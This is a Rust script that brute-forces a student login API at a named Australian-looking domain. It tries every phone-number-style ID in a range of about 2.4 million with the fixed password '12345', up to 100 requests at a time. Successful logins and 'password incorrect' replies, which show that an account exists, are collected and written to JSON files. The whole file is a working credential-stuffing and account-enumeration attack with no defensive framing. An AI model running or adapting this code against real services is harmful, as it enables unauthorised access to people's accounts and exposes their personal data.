use reqwest::Client;
use serde_json::{json, Value};
use std::fs::File;
use std::io::Write;
use std::sync::Arc;
use tokio::sync::Semaphore;

#[tokio::main]
async fn main() {
    let start: u64 = 0412800000;
    let end: u64 = 0415200000; // Adjust for testing
    let max_concurrent_requests = 100; // Limit the number of concurrent requests
    let success_file = "success.json";
    let password_error_file = "password_incorrect.json";

    let client = Arc::new(Client::new());
    let semaphore = Arc::new(Semaphore::new(max_concurrent_requests));

    let mut tasks = vec![];
    let total = end - start + 1;
    let progress = Arc::new(tokio::sync::Mutex::new(0));

    // Shared collections for responses
    let successes = Arc::new(tokio::sync::Mutex::new(Vec::new()));
    let password_errors = Arc::new(tokio::sync::Mutex::new(Vec::new()));

    for i in start..=end {

        let client = Arc::clone(&client);
        let semaphore = Arc::clone(&semaphore);
        let progress = Arc::clone(&progress);
        let successes = Arc::clone(&successes);
        let password_errors = Arc::clone(&password_errors);

        // Acquire a permit for controlled concurrency
        let permit = semaphore.acquire_owned().await.unwrap();

        let task = tokio::spawn(async move {
            let url = format!("http://myaustin.com.au/api/Student/Lgoin/{:010}/12345", i);
            println!("Processing number: {:010}", i);

            let response = match client.get(&url).send().await {
                Ok(response) => response.json::<Value>().await.unwrap_or_else(|_| json!({ "error": "Invalid JSON" })),
                Err(err) => json!({ "error": format!("Request failed: {}", err) }),
            };

            // Classify response based on the "ret" field
            if let Some(ret) = response.get("ret").and_then(|r| r.as_i64()) {
                match ret {
                    10000 => {
                        println!("{:010}: Success", i);
                        let mut successes_lock = successes.lock().await;
                        successes_lock.push(response);
                    }
                    10005 if response.get("msg").and_then(|m| m.as_str()) == Some("密码错误！") => {
                        println!("{:010}: Password Incorrect", i);
                        let mut password_errors_lock = password_errors.lock().await;
                        password_errors_lock.push(response);
                    }
                    _ => {
                        println!("{:010}: Other Response - {}", i, response);
                    }
                }
            } else {
                println!("{}: Invalid Response Structure", i);
            }

            // Update and print progress
            let mut progress_lock = progress.lock().await;
            *progress_lock += 1;
            println!("Progress: {}/{}", *progress_lock, total);

            if *progress_lock % 1000 == 0 {
                write_to_file(successes.lock().await.as_ref(), format!("cached/cached_success_{:010}.txt", *progress_lock).as_str());
                write_to_file(password_errors.lock().await.as_ref(), format!("cached/cached_fail_{:010}.txt", *progress_lock).as_str());
                tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
            }

            drop(permit);
        });

        tasks.push(task);
    }

    // Wait for all tasks to complete
    futures::future::join_all(tasks).await;

    // Write successes to the success file
    write_to_file(successes.lock().await.as_ref(), success_file);

    // Write password incorrect responses to the password error file
    write_to_file(password_errors.lock().await.as_ref(), password_error_file);

    println!("Processing complete. Results saved to '{}' and '{}'", success_file, password_error_file);
}

// Helper function to write JSON data to a file
fn write_to_file(data: &[Value], file_name: &str) {
    match File::create(file_name) {
        Ok(mut file) => {
            if let Err(err) = write!(file, "{}", serde_json::to_string_pretty(data).unwrap()) {
                eprintln!("Failed to write to file {}: {}", file_name, err);
            } else {
                println!("Results successfully written to {}", file_name);
            }
        }
        Err(err) => eprintln!("Failed to create file {}: {}", file_name, err),
    }
}
